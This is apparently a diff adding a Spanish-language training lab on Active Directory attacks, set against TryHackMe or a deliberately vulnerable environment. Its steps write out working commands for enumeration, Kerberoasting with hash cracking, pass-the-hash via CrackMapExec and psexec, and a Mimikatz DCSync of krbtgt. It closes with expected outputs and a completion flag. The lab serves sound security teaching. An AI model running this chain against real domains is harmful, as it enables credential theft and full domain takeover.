@@ -1,0 +1,91 @@
+# Lab 4: Active Directory - Kerberoasting y Pass-the-Hash
+
+## Objetivo
+
+Comprometer un dominio Windows utilizando técnicas de AD Attacks.
+
+## Prerrequisitos
+
+- TryHackMe: "Attacktive Directory" o entorno AD vulnerable
+- Kali Linux con herramientas Impacket
+
+## Entorno
+
+```bash
+# Instalar herramientas
+pip install impacket crackmapexec bloodhound neo4j
+```
+
+## Escenario
+
+Eres un pentester con acceso inicial a una máquina Windows en el dominio. Tu objetivo es escalar privilegios a Domain Admin.
+
+## Pasos
+
+### Paso 1: Enumeración Inicial
+
+```bash
+# Enumerar usuarios y políticas
+enum4linux 10.10.10.5
+
+# Buscar recursos compartidos
+smbclient -L //10.10.10.5 -N
+```
+
+### Paso 2: Kerberoasting
+
+```bash
+# Obtener tickets TGS
+python3 GetUserSPNs.py contoso.com/username:password -request
+
+# Crackear con Hashcat
+hashcat -m 13100 hash.txt wordlist.txt
+```
+
+### Paso 3: Pass-the-Hash
+
+```bash
+# Con CrackMapExec
+crackmapexec smb 10.10.10.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -x whoami
+
+# Con psexec
+python3 psexec.py contoso.com/admin@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+```
+
+### Paso 4: DCSync
+
+```bash
+# Con Mimikatz (en máquina comprometida)
+mimikatz> privilege::debug
+mimikatz> lsadump::dcsync /domain:contoso.com /user:krbtgt
+```
+
+## Entregable
+
+**Archivo**: `ad_compromise.md`
+
+Incluir:
+- Kill chain documentado
+- Comandos ejecutados con output
+- Flags capturados
+- Recomendaciones de hardening
+
+## Resultado Esperado
+
+Al completar el lab, el estudiante debe demostrar la cadena completa de compromiso del dominio:
+
+1. **Kerberoasting exitoso**: Output de `GetUserSPNs.py` mostrando al menos un ticket TGS en formato `$krb5tgs$23$*...` y el resultado de Hashcat con la contraseña en texto claro.
+2. **Pass-the-Hash funcional**: Output de CrackMapExec con `(Pwn3d!)` o resultado de `psexec.py` abriendo una shell con privilegios `NT AUTHORITY\SYSTEM`.
+3. **DCSync completado**: Output de Mimikatz mostrando el hash NTLM del usuario `krbtgt` (formato `aad3b435...`), que prueba el control total del dominio.
+4. **BloodHound graph**: Captura de pantalla del camino de ataque desde usuario inicial hasta Domain Admin visualizado en BloodHound.
+
+**Flag de completitud**: El archivo `ad_compromise.md` debe incluir el hash del usuario `Administrator` obtenido vía DCSync.
+
+## Recursos
+
+- [Impacket Suite - SecureAuthCorp](https://github.com/SecureAuthCorp/impacket)
+- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
+- [HackTricks: Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
+- [MITRE ATT&CK: T1558.003 - Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
+- [MITRE ATT&CK: T1550.002 - Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)
+- [TryHackMe: Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)
